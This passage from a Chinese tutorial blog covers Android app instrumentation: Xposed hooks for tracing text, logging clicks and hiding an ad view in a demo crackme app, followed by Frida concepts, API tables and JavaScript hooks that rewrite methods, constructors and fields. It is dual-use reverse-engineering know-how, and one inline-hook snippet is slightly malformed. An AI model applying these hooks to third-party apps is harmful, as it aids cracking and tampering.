class="markdownIt-Anchor" href="#字符串赋值定位"></a> 字符串赋值定位</h4><p>​常用于查看某一个文本是怎么来的，可以定位到关键的方法处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>, loadPackageParam.classLoader, <span class="hljs-string">&quot;setText&quot;</span>, CharSequence.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-built_in">super</span>.beforeHookedMethod(param);  <br>        Log.d(<span class="hljs-string">&quot;zj2595&quot;</span>,param.args[<span class="hljs-number">0</span>].toString());  <br>                <span class="hljs-keyword">if</span>(param.args[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;wuaipojie&quot;</span>))&#123;<span class="hljs-comment">//这里设置Text文本  </span><br>                    printStackTrace();  <br>                &#125;<br>    &#125;  <br>&#125;);<br><span class="hljs-comment">// printStackTrace()与handleLoadPackage(……)同级</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printStackTrace</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-type">Throwable</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Throwable</span>();  <br>    StackTraceElement[] stackElements = ex.getStackTrace();  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; stackElements.length; i++) &#123;  <br>        <span class="hljs-type">StackTraceElement</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> stackElements[i];  <br>        Log.d(<span class="hljs-string">&quot;Tag&quot;</span>,<span class="hljs-string">&quot;at &quot;</span> + element.getClassName() + <span class="hljs-string">&quot;.&quot;</span> + element.getMethodName() + <span class="hljs-string">&quot;(&quot;</span> + element.getFileName() + <span class="hljs-string">&quot;:&quot;</span> + element.getLineNumber() + <span class="hljs-string">&quot;)&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="点击事件的监听"><a class="markdownIt-Anchor" href="#点击事件的监听"></a> 点击事件的监听</h4><p>​点击按钮，查看触发了什么方法来定位</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> XposedHelpers.findClass(<span class="hljs-string">&quot;android.view.View&quot;</span>, loadPackageParam.classLoader);<br>XposedBridge.hookAllMethods(clazz, <span class="hljs-string">&quot;performClick&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;<span class="hljs-comment">//performClick是通用的</span><br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-built_in">super</span>.afterHookedMethod(param);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">listenerInfoObject</span> <span class="hljs-operator">=</span> XposedHelpers.getObjectField(param.thisObject, <span class="hljs-string">&quot;mListenerInfo&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">mOnClickListenerObject</span> <span class="hljs-operator">=</span> XposedHelpers.getObjectField(listenerInfoObject, <span class="hljs-string">&quot;mOnClickListener&quot;</span>);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">callbackType</span> <span class="hljs-operator">=</span> mOnClickListenerObject.getClass().getName();  <br>        Log.d(<span class="hljs-string">&quot;Tag&quot;</span>,callbackType);  <br>    &#125;  <br>&#125;);<br><br></code></pre></td></tr></table></figure><h4 id="改写布局"><a class="markdownIt-Anchor" href="#改写布局"></a> 改写布局</h4><p>​使用demo第6关的代码举例，这里通过定位资源来隐藏，可以实现对于广告的隐藏效果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.zj.wuaipojie.ui.ChallengeSixth&quot;</span>, lpparam.classLoader,  <br>        <span class="hljs-string">&quot;onCreate&quot;</span>, Bundle.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-built_in">super</span>.afterHookedMethod(param);  <br>        <span class="hljs-type">View</span> <span class="hljs-variable">img</span> <span class="hljs-operator">=</span> (View)XposedHelpers.callMethod(param.thisObject,  <br>                <span class="hljs-string">&quot;findViewById&quot;</span>, <span class="hljs-number">0x7f0800de</span>);  <br>        img.setVisibility(View.GONE);  <br><br>    &#125;  <br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="frida"><a class="markdownIt-Anchor" href="#frida"></a> Frida</h1><h2 id="动态二进制插桩"><a class="markdownIt-Anchor" href="#动态二进制插桩"></a> 动态二进制插桩</h2><h3 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h3><ul><li>动态二进制插桩(Dynamic Binary Instrumentation，DBI)是一种在程序运行时动态地修改二进制代码的技术。它通过在程序运行时注入代码，实现对程序的监控、分析和修改。DBI 可以用于各种用途，如调试、性能分析、安全检测、代码覆盖率测试等。</li><li>DBI 技术通常需要借助一些工具来实现，例如 Pin、DynamoRIO、Frida 等。这些工具可以通过动态插入代码来监控程序运行时的行为，例如记录函数调用、内存读写、系统调用等操作。通过分析这些信息，可以帮助开发人员调试程序、优化性能，也可以帮助安全研究人员检测漏洞、防御攻击。</li><li>DBI 技术的优点在于它可以不需要源代码就能够对程序进行修改和分析，而且可以对程序的任何部分进行监控，包括操作系统调用、库函数调用等。但是，由于在程序运行时插入代码会带来一定的性能损失，因此需要权衡性能和功能的需求。</li></ul><h3 id="两种模式"><a class="markdownIt-Anchor" href="#两种模式"></a> 两种模式</h3><p>二进制插桩主要可以分为两种主要模式：attach模式和spawn模式</p><ul><li>attach模式是在程序已经启动运行的情况下，通过DBI工具将监控代码注入到进程中，从而实现对该进程的监控和修改。这种模式适用于已经运行的进程，可以在不重启进程的情况下进行调试和分析。但是需要注意的是，attach模式可能会影响程序的性能，因为需要在进程运行时注入代码。</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402280848070.png" alt="image-20240228084813984" /></p><ul><li>spawn模式是在启动进程的时候，通过DBI工具将监控代码注入到进程中，从而实现对该进程的监控和修改。这种模式适用于需要对进程进行全面监控的情况，可以在进程启动时就开始监控，避免了attach模式可能带来的性能影响。但是需要注意的是，spawn模式需要对启动命令进行修改，可能会影响到进程的启动方式和参数。</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402280848022.png" alt="image-20240228084823958" /></p><table><thead><tr><th style="text-align:left">注入模式</th><th style="text-align:left">描述</th><th style="text-align:left">命令或参数</th><th style="text-align:left">优点</th><th style="text-align:left">主要用途</th></tr></thead><tbody><tr><td style="text-align:left">Spawn模式</td><td style="text-align:left">将启动App的权利交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App</td><td style="text-align:left">在CLI模式中，Frida通过加上 -f 参数指定包名以spawn模式操作App</td><td style="text-align:left">适合于需要在App启动时即进行注入的场景，可以在App启动时即捕获其行为</td><td style="text-align:left">当需要监控App从启动开始的所有行为时使用</td></tr><tr><td style="text-align:left">Attach模式</td><td style="text-align:left">在目标App已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作</td><td style="text-align:left">在CLI模式中，如果不添加 -f 参数，则默认会通过attach模式注入App</td><td style="text-align:left">适合于已经运行的App，不会重新启动App，对用户体验影响较小</td><td style="text-align:left">在App已经启动，或者我们只关心特定时刻或特定功能的行为时使用</td></tr></tbody></table><h3 id="三种执行模式"><a class="markdownIt-Anchor" href="#三种执行模式"></a> 三种执行模式</h3><ol><li><p>即时模式(Just-In-Time Mode)：即时模式是指在测试时，原始的二进制或可执行文件没有被修改或执行，而是将修改部分的二进制代码生成文件副本存储在新的内存区域中，在测试时仅执行修改部分的目标代码。这种方式可以减少对原始代码的侵入性，降低测试对系统性能的影响，同时也能够快速地进行测试。</p></li><li><p>解释模式(Interpretation Mode)：解释模式是指在测试时，目标代码被视为数据，测试人员插入的测试代码作为目标代码指令的解释语言，每当执行一条目标代码指令，程序就会在测试代码中查找并执行相应的替代指令，测试通过替代指令的执行信息就可以获取程序的运行信息。这种方式可以在不修改目标代码的情况下进行测试，但是对测试人员的技术水平要求比较高，同时也会对系统性能产生较大的影响。</p></li><li><p>探测模式(Probe Mode)：探测模式是指使用新指令覆盖旧指令进行测试，这种模式在某些体系结构(如x86)中比较好用。在探测模式中，测试人员可以在目标代码中插入监控代码，当目标代码执行到监控代码时，就会触发相应的操作，例如记录日志、修改寄存器等。探测模式可以在不修改目标代码的情况下进行测试，但是需要对目标代码进行覆盖，可能会对系统性能产生一定的影响。</p></li></ol><h2 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h2><p>​frida注入的原理就是找到目标进程，使用ptrace来跟踪目标进程，并获取mmap，dlpoen，dlsym等函数库的偏移。然后，它利用获取到的mmap在目标进程中申请一段内存空间。并在这段内存空间中找到并启动存放frida-agent-32/64.so的空间。最后，由agent执行各种操作。</p><table><thead><tr><th style="text-align:left">组件名称</th><th style="text-align:left">功能描述</th></tr></thead><tbody><tr><td style="text-align:left">frida-gum</td><td style="text-align:left">提供了inline-hook的核心实现，还包含了代码跟踪模块Stalker，用于内存访问监控的MemoryAccessMonitor，以及符号查找、栈回溯实现、内存扫描、动态代码生成和重定位等功能</td></tr><tr><td style="text-align:left">frida-core</td><td style="text-align:left">fridahook的核心，具有进程注入、进程间通信、会话管理、脚本生命周期管理等功能，屏蔽部分底层的实现细节并给最终用户提供开箱即用的操作接口。包含了frida-server、frida-gadget、frida-agent、frida-helper、frida-inject等关键模块和组件，以及之间的互相通信底座</td></tr><tr><td style="text-align:left">frida-gadget</td><td style="text-align:left">本身是一个动态库，可以通过重打包修改动态库的依赖或者修改smali代码去实现向三方应用注入gadget，从而实现Frida的持久化或免root</td></tr><tr><td style="text-align:left">frida-server</td><td style="text-align:left">本质上是一个二进制文件，类似于前面学习到的android_server，需要在目标设备上运行并转发端口，在Frida hook中起到关键作用</td></tr></tbody></table><h2 id="基础语法"><a class="markdownIt-Anchor" href="#基础语法"></a> 基础语法</h2><h3 id="java层"><a class="markdownIt-Anchor" href="#java层"></a> java层</h3><table><thead><tr><th style="text-align:left">API名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>Java.use(className)</code></td><td style="text-align:left">获取指定的Java类并使其在JavaScript代码中可用。</td></tr><tr><td style="text-align:left"><code>Java.perform(callback)</code></td><td style="text-align:left">确保回调函数在Java的主线程上执行。</td></tr><tr><td style="text-align:left"><code>Java.choose(className, callbacks)</code></td><td style="text-align:left">枚举指定类的所有实例。</td></tr><tr><td style="text-align:left"><code>Java.cast(obj, cls)</code></td><td style="text-align:left">将一个Java对象转换成另一个Java类的实例。</td></tr><tr><td style="text-align:left"><code>Java.enumerateLoadedClasses(callbacks)</code></td><td style="text-align:left">枚举进程中已经加载的所有Java类。</td></tr><tr><td style="text-align:left"><code>Java.enumerateClassLoaders(callbacks)</code></td><td style="text-align:left">枚举进程中存在的所有Java类加载器。</td></tr><tr><td style="text-align:left"><code>Java.enumerateMethods(targetClassMethod)</code></td><td style="text-align:left">枚举指定类的所有方法。</td></tr></tbody></table><h3 id="native层"><a class="markdownIt-Anchor" href="#native层"></a> native层</h3><p>​<code>Process</code> 对象代表当前被Hook的进程，能获取进程的信息，枚举模块，枚举范围等</p><table><thead><tr><th style="text-align:left">API</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left"><code>Process.id</code></td><td style="text-align:left">返回附加目标进程的 <code>PID</code></td></tr><tr><td style="text-align:left"><code>Process.isDebuggerAttached()</code></td><td style="text-align:left">检测当前是否对目标程序已经附加</td></tr><tr><td style="text-align:left"><code>Process.enumerateModules()</code></td><td style="text-align:left">枚举当前加载的模块，返回模块对象的数组</td></tr><tr><td style="text-align:left"><code>Process.enumerateThreads()</code></td><td style="text-align:left">枚举当前所有的线程，返回包含 <code>id</code>, <code>state</code>, <code>context</code> 等属性的对象数组</td></tr></tbody></table><p>​<code>Module</code> 对象代表一个加载到进程的模块(例如，在 Windows 上的 DLL，或在 Linux/Android 上的 .so 文件),能查询模块的信息，如模块的基址、名称、导入/导出的函数等</p><table><thead><tr><th style="text-align:left">API</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left"><code>Module.load()</code></td><td style="text-align:left">加载指定so文件，返回一个Module对象</td></tr><tr><td style="text-align:left"><code>enumerateImports()</code></td><td style="text-align:left">枚举所有Import库函数，返回Module数组对象</td></tr><tr><td style="text-align:left"><code>enumerateExports()</code></td><td style="text-align:left">枚举所有Export库函数，返回Module数组对象</td></tr><tr><td style="text-align:left"><code>enumerateSymbols()</code></td><td style="text-align:left">枚举所有Symbol库函数，返回Module数组对象</td></tr><tr><td style="text-align:left"><code>Module.findExportByName(exportName)、Module.getExportByName(exportName)</code></td><td style="text-align:left">寻找指定so中export库中的函数地址</td></tr><tr><td style="text-align:left"><code>Module.findBaseAddress(name)、Module.getBaseAddress(name)</code></td><td style="text-align:left">返回so的基地址</td></tr></tbody></table><p>​<code>Memory</code>是一个工具对象，提供直接读取和修改进程内存的功能，能够读取特定地址的值、写入数据、分配内存等</p><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left"><code>Memory.copy()</code></td><td style="text-align:left">复制内存</td></tr><tr><td style="text-align:left"><code>Memory.scan()</code></td><td style="text-align:left">搜索内存中特定模式的数据</td></tr><tr><td style="text-align:left"><code>Memory.scanSync()</code></td><td style="text-align:left">同上，但返回多个匹配的数据</td></tr><tr><td style="text-align:left"><code>Memory.alloc()</code></td><td style="text-align:left">在目标进程的堆上申请指定大小的内存，返回一个<code>NativePointer</code></td></tr><tr><td style="text-align:left"><code>Memory.writeByteArray()</code></td><td style="text-align:left">将字节数组写入一个指定内存</td></tr><tr><td style="text-align:left"><code>Memory.readByteArray</code></td><td style="text-align:left">读取内存</td></tr></tbody></table><h2 id="java层常用api"><a class="markdownIt-Anchor" href="#java层常用api"></a> java层常用API</h2><p>​下面是 hook 的基本框架，下面对于方法的hook都是在这个上面进行添加的(修改hookTest1()达到效果)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hookTest1</span>();<br>    &#125;);<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><h3 id="hook-普通方法-2"><a class="markdownIt-Anchor" href="#hook-普通方法-2"></a> hook 普通方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//定义一个名为hookTest1的函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest1</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span><br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;类名&quot;</span>);<br>    <span class="hljs-comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span><br>    utils.<span class="hljs-property">method</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>)&#123;<br>        <span class="hljs-comment">//将参数a和b的值改为123和456。</span><br>        a = <span class="hljs-number">123</span>;<span class="hljs-comment">//这里需要先将参数转化为相应java类型，例如如果这里是java.lang.String，</span><br>        b = <span class="hljs-number">456</span>;<span class="hljs-comment">//那么相应参数该变成Java.String.$new(&quot;456&quot;)，这里不报错是frida自动转化了</span><br>        <span class="hljs-comment">//调用修改过的&quot;method&quot;方法，并将返回值存储在`retval`变量中</span><br>        <span class="hljs-keyword">var</span> retval = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">method</span>(a, b);<br>        <span class="hljs-comment">//在控制台上打印参数a，b的值以及&quot;method&quot;方法的返回值</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b, retval);<br>        <span class="hljs-comment">//返回&quot;method&quot;方法的返回值</span><br>        <span class="hljs-keyword">return</span> retval;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hook-重载方法"><a class="markdownIt-Anchor" href="#hook-重载方法"></a> hook 重载方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// .overload()</span><br><span class="hljs-comment">// .overload(&#x27;自定义参数&#x27;)</span><br><span class="hljs-comment">// .overload(&#x27;int&#x27;)</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest2</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>);<br>    <span class="hljs-comment">//overload定义重载函数，根据函数的参数类型填，下面的Inner就是上面的method,Animal是自定义类型</span><br>    utils.<span class="hljs-property">Inner</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>)&#123;<br>        b = <span class="hljs-string">&quot;aaaaaaaaaa&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">Inner</span>(a,b);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hook-构造函数-2"><a class="markdownIt-Anchor" href="#hook-构造函数-2"></a> hook 构造函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest3</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>);<br>    <span class="hljs-comment">//修改类的构造函数的实现，$init表示构造函数</span><br>    utils.<span class="hljs-property">$init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str);<br>        str = <span class="hljs-string">&quot;52&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.$init(str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hook-字段"><a class="markdownIt-Anchor" href="#hook-字段"></a> hook 字段</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest4</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//静态字段的修改</span><br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>);<br>    <span class="hljs-comment">//修改类的静态字段&quot;flag&quot;的值</span><br>    utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;我是被修改的静态变量&quot;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span>);<br><br>    <span class="hljs-comment">//非静态字段的修改</span><br>    <span class="hljs-comment">//使用`Java.choose()`枚举类的所有实例</span><br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;<br>        <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>)&#123;<span class="hljs-comment">//obj类似于this，实例化了一个对象</span><br>            <span class="hljs-comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123&quot;，并修改非静态字段&quot;privateInt&quot;的值为99.</span><br>            obj.<span class="hljs-property">_privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;123&quot;</span>; <span class="hljs-comment">//字段名与函数名相同 前面加个下划线</span><br>            obj.<span class="hljs-property">privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-number">99</span>;<br>        &#125;,<br>        <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hook-内部类-2"><a class="markdownIt-Anchor" href="#hook-内部类-2"></a> hook 内部类</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest5</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//内部类</span><br>    <span class="hljs-keyword">var</span> innerClass = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerClass);<br>    innerClass.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;eeeeeeee&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="主动调用-2"><a class="markdownIt-Anchor" href="#主动调用-2"></a> 主动调用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 静态方法</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">ClassName</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>); <br><span class="hljs-title class_">ClassName</span>.<span class="hljs-title function_">privateFunc</span>(<span class="hljs-string">&quot;传参&quot;</span>);<br><br><br><span class="hljs-comment">// 非静态方法</span><br><span class="hljs-keyword">var</span> ret = <span class="hljs-literal">null</span>;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="hljs-comment">//要hook的类</span><br>        <span class="hljs-attr">onMatch</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>)&#123;<br>            ret=instance.<span class="hljs-title function_">privateFunc</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>); <span class="hljs-comment">//要hook的方法(aaaaaaa)</span><br>        &#125;,<br>        <span class="hljs-attr">onComplete</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-comment">//console.log(&quot;result: &quot; + ret);</span><br>        &#125;<br>    &#125;);<br>&#125;)<br><span class="hljs-comment">//return ret;</span><br></code></pre></td></tr></table></figure><h3 id="inline-hook"><a class="markdownIt-Anchor" href="#inline-hook"></a> inline hook</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> inline_B34 = base.<span class="hljs-title function_">add</span>(<span class="hljs-number">0xB34</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">0x0</span>)# 根据so文件获取固定地址<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(inline_B34,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>        <span class="hljs-comment">// 这里通过this.context.寄存器得到寄存器的值</span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;called enter inline_B34  = &quot;</span> +<span class="hljs-title function_">hexdump</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x0</span>))<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="so层常用api"><a class="markdownIt-Anchor" href="#so层常用api"></a> so层常用API</h2><h3 id="基址获取方法"><a class="markdownIt-Anchor" href="#基址获取方法"></a> 基址获取方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleAddr1 = <span class="hljs-title class_">Process</span>.<span class="hljs-title 